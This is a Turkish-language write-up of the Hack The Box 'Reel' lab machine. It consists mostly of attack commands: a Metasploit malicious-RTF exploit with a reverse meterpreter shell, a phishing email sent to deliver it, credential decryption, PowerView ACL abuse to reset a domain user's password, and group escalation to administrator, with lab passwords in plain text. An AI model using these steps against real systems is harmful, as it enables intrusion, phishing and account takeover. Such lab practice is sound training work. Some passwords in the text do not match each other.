@@ -1,0 +1,73 @@
+ftp ye Anonymous olarak bağlanılır.
+
+ftp 10.10.10.77
+burada bulunan documents dosyasının içerisindeki 3 docx dosyası indirilir.(get komutu ile)
+exiftool Windos...docx /bu dosya exiftool ile açılır ve "nico" kullanıcı ismi buradan bulunur.
+
+25 nolu portun açık olması ile mail istemcisinin çalıştığı anlaşılır. exiftool ile de nico adlı kullanıcının rtf dosyalarını okuduğu görülmüştür.
+
+msfconsole açılır;
+use exploit/windows/fileformat/office_word_hta
+set payload windows/meterpreter/reverse_tcp
+set lhost htb.ip
+set srvhost htb.ip
+set lport 4444
+set filename updates.rtf
+exploit 
+//komutları sırası ile girilir.
+daha sonra aşağıdaki komutlar ile nico kullanıcısının çalıştırması için mail yollanır.
+sendemail -f me@htb.local -t you@htb.local -m howdy -u totallyLegit -s 10.10.10.77:25 -a /root/.msf4/local/updates.rtf
+
+yaklaşaık 1 dakika sonra;
+session -i 1 // komutları girilerek Reel makinesine bağlanılmış olunur.
+cd Users/nico/Desktop konumuna gidilerek. user.txt bulunur.
+
+masa üstündeki creed.xml den yola çıkılarak
+powershell çalıştırılır
+bunun için: /Windows/syswow/windowspowershell/v1.0 dizinine gidilir ve "execute -f powershell.exe" komutu verilir.
+use powershell //komutu verilir.
+daha sonra verilen id numarası ile
+powershell_shell -s id //girilerek windows power shell ortamına geçilir. 
+masa üstündeki cred.xml dosyasından "tom" kullanıcı adının şifresini bulmak için;
+$Credential = Import-CliXml -Path "cred.xml"
+$credential.GetNetworkCredential().password    //komutları kullanılır ve 1ts-mag1c!!! şifresi elde edilir.
+
+
+tom - 1ts-mag1c!!! kullanıcı adı ve şifresi ile ssh üzerinden yeni bağlantı kurulur.
+https://wald0.com/?p=112    // burdan sonrası için bulunan yardım linki.
+
+tekrar powershell e geçilir.
+net user claire / domain 	//komutu ile claire nin sahip olduğu gruplara bakılır. (tüm kullanıcılar arasnından claire seçildi)
+
+
+/Users/tom/Desktop/AD Audit/BloodHound
+
+Import-Module .\Powerview.ps1
+Set-DomainObjectOwner -Identity Claire -OwnerIdentity Tom
+Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights All
+$userpassword = ConvertTo-SecureString 'Deneme112233*' -AsPlainText -Force
+Set-DomainUserPassword -Identity claire -AccountPassword $userpassword
+
+
+komutları çalıştırıldıkdan sonra;
+ssh claire@localhost   /şifre: Deneme123* ile claire hesabına geçilir.
+ 
+net user
+net user Administrator
+net group Backup_Admins claire /add
+net group Backup_Admins
+net user claire
+////claire hesabına admin yetkileri verilir.
+/// tekrrar tom hesabında aşağıdaki komutlar girilir.
+$userpassword = ConvertTo-SecureString '1ts-mag1c!!!' -AsPlainText -Force
+Set-ADAccountPassword -Identity claire -NewPassword $userpassword
+///claire hesabından logout olunur.
+ssh claire@localhost   /şifre:1ts-mag1c!!!     ile tekrar bağlanılır ve Administrator klasörüne gidilir.
+type .\BackupScript.ps1  dosyası okunur.
+en üstte ;
+admin password                                                                               
+$password="Cr4ckMeIfYouC4n!"
+bulunur.
+ssh administrator@10.10.10.77  ///şifre: Cr4ckMeIfYouC4n!
+admin masa üstüne gidilir ve type root.txt 
+
